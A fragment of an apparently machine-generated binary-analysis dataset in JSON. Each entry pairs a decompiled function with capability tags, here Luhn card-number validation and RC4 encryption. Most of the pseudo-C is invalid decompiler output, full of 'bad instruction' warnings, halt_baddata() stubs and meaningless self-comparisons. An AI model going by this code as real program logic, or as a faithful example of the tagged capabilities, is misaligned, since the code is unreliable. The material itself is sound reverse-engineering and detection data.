*(iVar52 + 0xb8);\n    in_XMM6_Da = *(iVar52 + 0x58);\n    in_XMM6_Db = *(iVar52 + 0x5c);\n    in_XMM6_Dc = *(iVar52 + 0x60);\n    in_XMM6_Dd = *(iVar52 + 100);\n    ppiVar60 = *(puVar72 + 0x78);\n    *(puVar72 + 0x30) = 0xe;\n    goto code_r0x00014003a712;\n}\n",
        "token_count": 47765
    },
    "140083b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00014010ad6e) overlaps instruction at (ram,0x00014010ad6d)\n// \n// WARNING: Removing unreachable block (ram,0x00014010ab90)\n\nchar * fcn.140083b60(uint *arg1, ulong arg2, int64_t *arg3)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    uint8_t uVar8;\n    char cVar9;\n    uint8_t uVar10;\n    uint8_t uVar16;\n    uint8_t uVar17;\n    uint32_t uVar11;\n    uint64_t uVar12;\n    uint8_t *puVar13;\n    ushort uVar18;\n    uint **ppuVar20;\n    uint **ppuVar21;\n    char **ppcVar22;\n    ulong *puVar23;\n    char **ppcVar24;\n    char **ppcVar27;\n    uint64_t unaff_RBP;\n    uchar *puVar28;\n    uint8_t *unaff_RSI;\n    uint8_t *puVar29;\n    uint *unaff_RDI;\n    ulong *in_R9;\n    ulong in_R11;\n    int64_t in_FS_OFFSET;\n    int64_t in_GS_OFFSET;\n    bool bVar30;\n    bool bVar31;\n    bool bVar32;\n    bool bVar33;\n    ulong in_XMM1_Qa;\n    ulong *in_stack_00000028;\n    uint8_t in_stack_00000048;\n    uint *puStack104;\n    uchar auStack96 [56];\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    char *pcVar14;\n    uint8_t *puVar15;\n    int32_t iVar19;\n    char **ppcVar25;\n    char **ppcVar26;\n    \n    ppuVar21 = &puStack104;\n    uStack24 = *in_R9;\n    uStack40 = *in_stack_00000028;\n    uVar11 = in_stack_00000048 - 100 & 0xff;\n    uStack16 = in_R9[1];\n    uVar12 = *(uVar11 * 4 + 0x14010a920);\n    uStack32 = in_stack_00000028[1];\n    puVar13 = uVar12 + 0x14010a920;\n    uVar10 = arg3;\n    cVar9 = puVar13;\n    switch(uVar11) {\n    case 0:\n        (**(*arg3 + 0x20))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    default:\n        (**(*arg3 + 0x38))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 9:\n        (**(*arg3 + 0x30))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x10:\n        (**(*arg3 + 0x18))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x13:\n        (**(*arg3 + 0x28))(uStack40, in_XMM1_Qa, uStack24, arg1, arg3, &uStack24, &uStack40);\n        return arg1;\n    case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x18:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x21:\n    case 0x22:\n    case 0x23:\n    case 0x91:\n    case 0x92:\n    case 0x93:\n        *(arg1 - 0x6c9f0009U) = *(arg1 - 0x6c9f0009U) ^ uVar10;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x24:\n    case 0x94:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x25:\n    case 0x95:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x26:\n    case 0x96:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x27:\n    case 0x38:\n    case 0x97:\n    case 0xa8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x28:\n    case 0x39:\n    case 0x98:\n    case 0xa9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x29:\n    case 0x3a:\n    case 0x99:\n    case 0xaa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2a:\n    case 0x9a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2b:\n    case 0x9b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2c:\n    case 0x9c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2d:\n    case 0x9d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2e:\n    case 0x9e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2f:\n    case 0x9f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x30:\n    case 0xa0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x31:\n    case 0xa1:\n        *puVar13 = *puVar13 + cVar9;\n        *(puVar13 * 2) = *(puVar13 * 2) + ' ';\n        *puVar13 = *puVar13 + cVar9;\n        pcVar14 = puVar13 & 0xffffffffffffff00 | cVar9 + *puVar13;\n        *pcVar14 = *pcVar14 + cVar9 + *puVar13;\n        return pcVar14;\n    case 0x32:\n    case 0x43:\n    case 0x65:\n    case 0x70:\n    case 0x85:\n    case 0xa2:\n    case 0xb3:\n    case 0xea:\n    case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x33:\n    case 0x44:\n    case 0x66:\n    case 0x71:\n    case 0x86:\n    case 0xa3:\n    case 0xb4:\n    case 0xeb:\n    case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x34:\n    case 0x45:\n    case 0x67:\n    case 0x72:\n    case 0x87:\n    case 0xa4:\n    case 0xb5:\n    case 0xec:\n    case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x35:\n    case 0xa5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x36:\n    case 0xa6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x37:\n    case 0xa7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3b:\n    case 0xab:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3c:\n    case 0xac:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3d:\n    case 0xad:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3e:\n    case 0xae:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3f:\n    case 0xaf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x40:\n    case 0xb0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x41:\n    case 0xb1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x42:\n    case 0xb2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x46:\n    case 0xb6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x47:\n    case 0xb7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x48:\n    case 0x80:\n    case 0x8c:\n    case 0xb8:\n    case 0xd5:\n    case 0xe5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x49:\n    case 0x81:\n    case 0x8d:\n    case 0xb9:\n    case 0xd6:\n    case 0xe6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4a:\n    case 0x82:\n    case 0x8e:\n    case 0xba:\n    case 0xd7:\n    case 0xe7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4b:\n    case 0xbb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4c:\n    case 0xbc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4d:\n    case 0x53:\n    case 0x58:\n    case 0x6a:\n    case 0xbd:\n    case 0xc3:\n    case 200:\n    case 0xda:\n    case 0xfb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4e:\n    case 0x54:\n    case 0x59:\n    case 0x6b:\n    case 0xbe:\n    case 0xc4:\n    case 0xc9:\n    case 0xdb:\n    case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4f:\n    case 0x55:\n    case 0x5a:\n    case 0x6c:\n    case 0xbf:\n    case 0xc5:\n    case 0xca:\n    case 0xdc:\n    case 0xfd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x50:\n    case 0x5b:\n    case 0xc0:\n    case 0xcb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x51:\n    case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x52:\n    case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x56:\n    case 0xc6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x57:\n    case 199:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5c:\n    case 0xcc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5d:\n    case 0xcd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5e:\n    case 0xce:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5f:\n    case 0xcf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x60:\n    case 0x7b:\n    case 0x89:\n    case 0xd0:\n    case 0xe0:\n    case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x61:\n    case 0x7c:\n    case 0x8a:\n    case 0xd1:\n    case 0xe1:\n    case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x62:\n    case 0x7d:\n    case 0xd2:\n    case 0xe2:\n    case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 99:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 100:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x68:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x69:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6f:\n        break;\n    case 0x73:\n    case 0xed:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x74:\n    case 0xee:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x75:\n    case 0xef:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x76:\n    case 0xf0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x77:\n    case 0xf1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x78:\n    case 0xf2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x79:\n    case 0xf3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7a:\n    case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7e:\n    case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7f:\n    case 0xe4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x83:\n    case 0xe8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x84:\n    case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x88:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x90:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xde:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (0xfffffffebfef56df < uVar12 || puVar13 == NULL) {\n        puVar13 = unaff_RDI + unaff_RBP * 2 + 99;\n        *puVar13 = *puVar13 & 0xa9;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *0x14010a993 = *0x14010a993 & 0xa9;\n    uVar8 = puVar13 >> 8;\n    *0x1603a1f87 = *0x1603a1f87 & uVar8;\n    uVar11 = puVar13;\n    uVar16 = arg3 >> 8;\n    uVar18 = SUB82(arg3, 0);\n    iVar19 = arg3;\n    if (0x6968741f < uVar11) {\n        ppuVar20 = *(arg1 + 0x5f) * 0x69727473;\n        puVar15 = unaff_RSI + 1;\n        out(*unaff_RSI, uVar18);\n        puVar29 = iVar19;\n        uVar17 = arg1 >> 8;\n        bVar30 = uVar17 < *puVar29;\n        bVar32 = uVar17 == *puVar29;\n        puStack104 = unaff_RDI;\n        if (!SBORROW1(uVar17, *puVar29)) {\n            if (!bVar30) {\n                puVar29 = arg3 + 0x61;\n                bVar30 = CARRY1(*puVar29, uVar8);\n                *puVar29 = *puVar29 + uVar8;\n                bVar32 = *puVar29 == 0;\n                if (!bVar30) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                uVar4 = *(unaff_RDI + 0x73);\n                if (!bVar32) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\ncode_r0x00014010aad0:\n                arg1 = uVar4;\n                if (bVar32) {\ncode_r0x00014010ab44:\n                    if (!bVar30) goto code_r0x00014010abaf;\n                    arg1 = *(puStack104 + 0x73);\n                    if (bVar32) goto code_r0x00014010abbd;\n                }\n                else {\n                    bVar30 = *(puVar15 + 0x67) * 0x6e693a3a != *(puVar15 + 0x67) * 0x6e693a3a;\n                    if (!bVar30) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    if (bVar30) {\ncode_r0x00014010ab51:\n                        if (!bVar30) goto code_r0x00014010abbc;\n                        arg1 = *(unaff_RDI + 0x73);\n                        if (!bVar32) {\n                            return;\n                        }\n                        if (!bVar32) {\n                            bVar33 = *(puVar15 + 0x67) * 0x6f633a3a != *(puVar15 + 0x67) * 0x6f633a3a;\n                            goto code_r0x00014010abfc;\n                        }\n                        *puVar15 = *puVar15 & arg1 >> 8;\n                        goto code_r0x00014010abc1;\n                    }\n                    *puVar13 = *puVar13 + cVar9;\n                    puVar29 = arg3 + 0x61;\n                    uVar17 = *puVar29;\n                    *puVar29 = *puVar29 + uVar8;\n                    bVar32 = *puVar29 == 0;\n                    if (!CARRY1(uVar17, uVar8)) {\n                        puVar29 = iVar19 + 0x61;\n                        bVar30 = CARRY1(*puVar29, uVar8);\n                        *puVar29 = *puVar29 + uVar8;\n                        bVar32 = *puVar29 == 0;\n                        goto code_r0x00014010ab51;\n                    }\n                    arg1 = *(unaff_RDI + 0x73);\n                    if (!bVar32) {\n                        bVar30 = *(puVar15 + 0x67) * 0x535f3a3a != *(puVar15 + 0x67) * 0x535f3a3a;\n                        goto code_r0x00014010aaf0;\n                    }\n                }\n                ppcVar22 = *(arg1 + 0x5f) * 0x69727473;\n                puVar29 = puVar15 + 1;\n                out(*puVar15, uVar18);\n                if (arg1 >> 8 < *iVar19) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                puVar13 = uVar11 + 0x85968cc2;\n                *(in_GS_OFFSET + 0x14010a920) = *(in_GS_OFFSET + 0x14010a920) + 'W';\n                goto code_r0x00014010abdc;\n            }\n            puStack104 = *ppuVar20;\n            ppuVar20 = ppuVar20 + 1;\n            if (!bVar30) {\n                out(*puVar15, uVar18);\n                return;\n            }\n            puVar29 = puVar15;\n            if (!bVar30) {\n                out(*puVar15, uVar18);\n                return;\n            }\ncode_r0x00014010ab27:\n            if (!bVar30) {\n                puVar15 = puVar29 + 1;\n                out(*puVar29, uVar18);\n                uVar17 = arg1 >> 8;\n                bVar30 = uVar17 < *iVar19;\n                bVar31 = (POPCOUNT(uVar17 - *iVar19) & 1U) == 0;\n                if (bVar30) {\n                    *(in_GS_OFFSET + 0x14010a920) = *(in_GS_OFFSET + 0x14010a920) + 'W';\n                    goto code_r0x00014010ab97;\n                }\n                goto code_r0x00014010ab2f;\n            }\n            uVar12 = *(arg3 + 0x65) * 0x28202928;\n            puStack104 = uVar12 & 0xffffffff;\n            bVar30 = uVar12 != uVar12;\ncode_r0x00014010ab99:\n            puVar15 = puVar29;\n            if (bVar30 || bVar32) goto code_r0x00014010ab9b;\ncode_r0x00014010ac03:\n            arg1 = *(puStack104 + 0x73);\n            if (bVar32) goto code_r0x00014010ac7a;\n            unaff_RDI = puStack104 + 1;\n            uVar3 = in(uVar18);\n            *puStack104 = uVar3;\n            goto code_r0x00014010ac02;\n        }\n        puVar29 = arg3 + 0x61;\n        bVar30 = CARRY1(*puVar29, uVar8);\n        uVar17 = *puVar29;\n        *puVar29 = *puVar29 + uVar8;\n        bVar32 = *puVar29 == 0;\n        bVar31 = (POPCOUNT(*puVar29) & 1U) == 0;\n        if (bVar30) {\n            arg1 = *(unaff_RDI + 0x73);\n            if ((bVar32) || (bVar30 = *(unaff_RSI + 0x68) * 0x73613a3a != *(unaff_RSI + 0x68) * 0x73613a3a,  !bVar30))\n            goto code_r0x00014010ab2f;\n            puVar28 = puVar15;\n            puVar15 = puVar15 & 0xffffffff00000000 | ZEXT48(puVar28 + 1);\n            out(*puVar28, uVar18);\n            puVar29 = arg3 + 0x61;\n            bVar30 = CARRY1(*puVar29, uVar8);\n            *puVar29 = *puVar29 + uVar8;\n            bVar32 = *puVar29 == 0;\n            if (bVar30) {\n                uVar4 = *(unaff_RDI + 0x73);\n                goto code_r0x00014010aad0;\n            }\ncode_r0x00014010ab36:\n            if (!bVar30) {\n                *0x1403a2121 = *0x1403a2121 & uVar8;\n                goto code_r0x00014010aba7;\n            }\n            arg1 = *(puStack104 + 0x73);\n            if (!bVar32) {\n                bVar30 = *(puVar15 + 0x67) * 0x61623a3a != *(puVar15 + 0x67) * 0x61623a3a;\n                goto code_r0x00014010ab44;\n            }\n            goto code_r0x00014010abaf;\n        }\ncode_r0x00014010ab21:\n        puVar15 = unaff_RSI + 1;\n        bVar33 = SCARRY1(uVar17, uVar8);\n        if (bVar30) {\n            arg1 = *(puStack104 + 0x73);\n            if (bVar32) goto code_r0x00014010ab9a;\n            bVar30 = *(unaff_RSI + 0x68) * 0x65723a3a != *(unaff_RSI + 0x68) * 0x65723a3a;\ncode_r0x00014010ab2f:\n            if (!bVar30) goto code_r0x00014010ab9a;\n            if (bVar31) {\n                *(puStack104 + 0x1a) = *(puStack104 + 0x1a) - uVar16;\n                goto code_r0x00014010ab9b;\n            }\n            puVar29 = arg3 + 0x61;\n            bVar30 = CARRY1(*puVar29, uVar8);\n            *puVar29 = *puVar29 + uVar8;\n            bVar32 = *puVar29 == 0;\n            goto code_r0x00014010ab36;\n        }\n        *(ppuVar20 + -8) = 0x3e2d7369;\n        if (bVar30) {\n            if (bVar31) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *0x14010a920 = *0x14010a920 + 'W';\ncode_r0x00014010ab97:\n            bVar30 = false;\n            *puVar13 = *puVar13 & 0xa9;\n            bVar32 = *puVar13 == 0;\n            puVar29 = puVar15;\n            goto code_r0x00014010ab99;\n        }\ncode_r0x00014010abfc:\n        if (!bVar33) {\n            puVar29 = arg3 + 0x61;\n            uVar16 = *puVar29;\n            *puVar29 = *puVar29 + uVar8;\n            bVar32 = *puVar29 == 0;\n            if (!CARRY1(uVar16, uVar8)) {\n                return;\n            }\n            goto code_r0x00014010ac03;\n        }\ncode_r0x00014010ac7a:\n        if (!bVar32) {\n            bVar30 = *(puVar15 + 0x67) * 0x65723a3a != *(puVar15 + 0x67) * 0x65723a3a;\n            puVar29 = puVar15;\n            unaff_RDI = puStack104;\n            goto joined_r0x00014010ac83;\n        }\ncode_r0x00014010acee:\n        uVar2 = in(uVar18);\n        *puStack104 = uVar2;\n        puVar29 = puVar15;\ncode_r0x00014010acef:\n        iVar6 = *(puVar13 * 2 + 0x62) * 0x63697361;\n        bVar30 = iVar6 != iVar6;\n        if (bVar30) {\n            if (!bVar30) {\n                out(*puVar29, uVar18);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            goto code_r0x00014010ad65;\n        }\ncode_r0x00014010ad6e:\n        *puVar13 = *puVar13 + puVar13;\n    }\n    else {\n        if (0x6968741f < uVar11) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar15 = unaff_RSI;\n        if ((POPCOUNT(uVar11 + 0x96978be0 & 0xff) & 1U) == 0) {\n            puVar29 = arg3 + in_GS_OFFSET + 0x61;\n            bVar30 = CARRY1(*puVar29, uVar8);\n            *puVar29 = *puVar29 + uVar8;\n            bVar32 = *puVar29 == 0;\n            if (bVar30) {\n                arg1 = *(unaff_RDI + 0x73);\n                goto code_r0x00014010aa88;\n            }\n            ppuVar20 = &puStack104;\n            puStack104 = arg1;\ncode_r0x00014010aaf0:\n            unaff_RDI = *ppuVar20;\n            puVar23 = ppuVar20 + 1;\n            ppuVar21 = ppuVar20 + 1;\n            unaff_RBP = *(unaff_RDI + 0x6e);\n            puVar7 = ppuVar20 + 1;\n            if (!bVar30) goto code_r0x00014010ab6a;\n            if (!bVar30) {\n                puVar15 = *(uVar12 + 0x14010a98e);\n                goto code_r0x00014010aafc;\n            }\ncode_r0x00014010ab6d:\n            *puVar13 = *puVar13 + puVar13;\n            uVar8 = puVar13 >> 8;\n            bVar30 = CARRY1(*0x19f30e5e8, uVar8);\n            bVar32 = SCARRY1(*0x19f30e5e8, uVar8);\n            *0x19f30e5e8 = *0x19f30e5e8 + uVar8;\n            puStack104 = *puVar23;\n            ppuVar20 = puVar23 + 1;\n            if (bVar32) {\n                return;\n            }\n            if (!bVar30) {\ncode_r0x00014010ab9a:\n                *(ppuVar20 + -8) = 0x20686369;\n                *puVar13 = *puVar13 + puVar13;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(puStack104 + 0x1a) = *(puStack104 + 0x1a) - uVar16;\n            goto code_r0x00014010ab7d;\n        }\n        *0x14010a920 = *0x14010a920 + 'W';\n        *puVar13 = *puVar13 & 0xa9;\n        bVar32 = *puVar13 == 0;\n        if (bVar32) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\ncode_r0x00014010aa88:\n        if (bVar32) {\ncode_r0x00014010aafc:\n            puVar7 = ppuVar21;\n            if (!bVar32) {\ncode_r0x00014010ab6a:\n                puVar23 = puVar7;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                puVar13 = uVar11 & 0x5f203a73;\n                goto code_r0x00014010ab6d;\n            }\n            puStack104 = unaff_RDI + 1;\n            uVar2 = in(uVar18);\n            *unaff_RDI = uVar2;\n            puVar29 = puVar15 + 0x6f;\n            bVar30 = false;\n            *puVar29 = *puVar29 & 0xa9;\n            bVar32 = *puVar29 == 0;\n        }\n        else {\n            uVar5 = *(unaff_RSI + 0x67) * 0x4d5f3a3a;\n            unaff_RBP = uVar5 & 0xffffffff;\n            bVar30 = uVar5 != uVar5;\n            ppuVar20 = auStack96;\n            ppuVar21 = auStack96;\n            if (bVar30) {\n                if (bVar32) {\n                    out(*unaff_RSI, uVar18);\n                    puVar15 = arg3 + in_FS_OFFSET + 0x61;\n                    bVar30 = CARRY1(*puVar15, uVar8);\n                    uVar17 = *puVar15;\n                    *puVar15 = *puVar15 + uVar8;\n                    bVar32 = *puVar15 == 0;\n                    bVar31 = (POPCOUNT(*puVar15) & 1U) == 0;\n                    goto code_r0x00014010ab21;\n                }\n                puVar15 = unaff_RSI + 1;\n                out(*unaff_RSI, uVar18);\n                unaff_RDI = puStack104;\n                goto code_r0x00014010aafc;\n            }\n            ppuVar21 = auStack96;\n            if (!bVar30) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        if (bVar32) {\n            puStack104 = *ppuVar21;\n            ppuVar20 = ppuVar21 + 1;\n            puVar29 = puVar15;\n            if (bVar30) goto code_r0x00014010ab27;\ncode_r0x00014010ab9b:\n            ppuVar20 = arg1[0x1a] * 0x20736920;\n            puVar13 = uVar11 & 0x29757a;\ncode_r0x00014010aba7:\n            puVar29 = arg3 + 0x61;\n            uVar8 = *puVar29;\n            uVar16 = puVar13 >> 8;\n            *puVar29 = *puVar29 + uVar16;\n            bVar32 = *puVar29 == 0;\n            if (!CARRY1(uVar8, uVar16)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            arg1 = *(puStack104 + 0x73);\ncode_r0x00014010abaf:\n            if (bVar32) {\n                *ppuVar20 = arg1;\n                return;\n            }\ncode_r0x00014010abb1:\n            puStack104 = *(ppuVar20 + 8);\ncode_r0x00014010abbc:\n            out(*puVar15, uVar18);\n            puVar15 = puVar15 + 1;\n        }\n        else {\n            if (bVar30 || bVar32) {\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                *puVar13 = *puVar13 + cVar9;\n                puVar23 = ppuVar21;\n                goto code_r0x00014010ab6d;\n            }\n            uVar2 = in(uVar18);\n            *puStack104 = uVar2;\n            uVar5 = *(puVar13 + uVar12 + 0x14010a982) * 0x63697361;\n            bVar30 = uVar5 == uVar5;\n            puStack104 = *(uVar5 & 0xffffffff);\n            ppuVar20 = (uVar5 & 0xffffffff) + 1;\n            if (bVar30) {\n                if (bVar32) {\n                    *puVar15 = *puVar15 & arg1 >> 8;\n                    puVar29 = uVar12 + 0x14010a989 + unaff_RBP * 2;\n                    *puVar29 = *puVar29 & uVar16;\n                    goto code_r0x00014010ab7d;\n                }\n                goto code_r0x00014010abb1;\n            }\n            if (bVar30) {\n                out(*puVar15, uVar18);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\ncode_r0x00014010ab7d:\n            puVar13 = puVar13 & 0x2029757a;\n            puVar13[unaff_RBP * 2 + 0x69] = puVar13[unaff_RBP * 2 + 0x69] & uVar16;\n        }\ncode_r0x00014010abbd:\n        *puVar13 = *puVar13 & 0xa9;\n        unaff_RDI = puStack104;\n        if (*puVar13 != 0) {\n            return;\n        }\ncode_r0x00014010abc1:\n        ppcVar22 = arg1[0x1a] * 0x20736920;\n        uVar11 = puVar13 & 0x2029757a;\n        puVar13 = uVar11;\n        if (0x6968741f < uVar11) {\ncode_r0x00014010ac02:\n            ppcVar22 = *(arg1 + 0x5f) * 0x69727473;\n            puVar29 = puVar15 + 1;\n            out(*puVar15, uVar18);\n            uVar8 = arg1 >> 8;\n            bVar30 = uVar8 < *iVar19;\n            if (SBORROW1(uVar8, *iVar19)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if (bVar30) {\n                if (!bVar30) goto code_r0x00014010acef;\n                if (!bVar30) {\n                    out(*puVar29, uVar18);\n                    bVar30 = SBORROW1(uVar8, *iVar19);\n                    puVar29 = puVar15 + 2;\n                    if (*iVar19 <= uVar8) goto joined_r0x00014010ac83;\n                    out(puVar15[2], uVar18);\n                    puVar29 = puVar15 + 7;\n                    out(*(puVar15 + 3), uVar18);\n                }\ncode_r0x00014010ace6:\n             